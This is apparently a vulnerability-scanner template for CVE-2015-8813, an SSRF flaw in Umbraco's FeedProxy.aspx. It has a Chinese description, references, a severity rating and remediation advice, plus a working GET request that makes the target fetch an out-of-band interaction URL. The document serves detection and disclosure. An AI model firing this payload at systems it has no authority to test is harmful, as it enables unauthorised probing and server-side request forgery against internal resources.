id: CVE-2015-8813
info:
  name: Umbraco SSRF Vulnerability in Feedproxy.aspx
  author:
  - l0ne1y
  tags:
  - cve
  - cve2015
  - ssrf
  - oast
  - umbraco
  description: |2-
     Umbraco SSRF
    Umbraco是丹麦Umbraco公司的一套使用ASP.Net构建，Mysql进行数据存储的内容管理系统（CMS）。该系统支持自定义模板、管理用户、对内容进行权限定义等。

    Umbraco 7.4.0之前的版本中的Umbraco.Web/umbraco.presentation/umbraco/dashboard/FeedProxy.aspx.cs文件中的‘Page_Load’函数存在安全漏洞。远程攻击者可借助‘url’参数利用该漏洞实施服务器端请求伪造攻击。
  reference:
  - https://blog.securelayer7.net/umbraco-the-open-source-asp-net-cms-multiple-vulnerabilities/
  - https://nvd.nist.gov/vuln/detail/cve-2015-8813
  - https://github.com/umbraco/umbraco-cms/commit/924a016ffe7ae7ea6d516c07a7852f0095eddbce
  - http://www.openwall.com/lists/oss-security/2016/02/18/8
  severity: high
  classification:
    cve-id:
    - cve-2015-8813
    cwe-id:
    - cwe-918
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:N
    cvss-score: 8.2
  remediation: |
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：http://issues.umbraco.org/issue/U4-7457

    临时修复方案：
    1、过滤内网服务器对公网服务器请求的响应。如果Web应用是获取某一类型的文件，在把返回结果展示给用户之前应先验证返回的信息是否符合文件类型标准，比如返回信息应为图片，如果返回信息是HTML，则停止将返回信息返回客户端。
    2、统一错误提示信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
    3、在内网服务器的防火墙上限制公网服务器的请求端口为HTTP等协议常用端口，如：80、443、8080、8090。
    4、若公网服务器的内网IP与内网无业务通信，建议将公网服务器对应的内网IP列入黑名单，避免应用被用来获取内网数据。
    5、内网服务器禁用不必要的协议，仅允许HTTP和HTTPS请求，防止类似于file:///、gopher://、ftp:// 等协议引起的安全问题。
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
  path:
  - '{{BaseURL}}/Umbraco/feedproxy.aspx?url=http://{{interactsh-url}}'
  method: GET
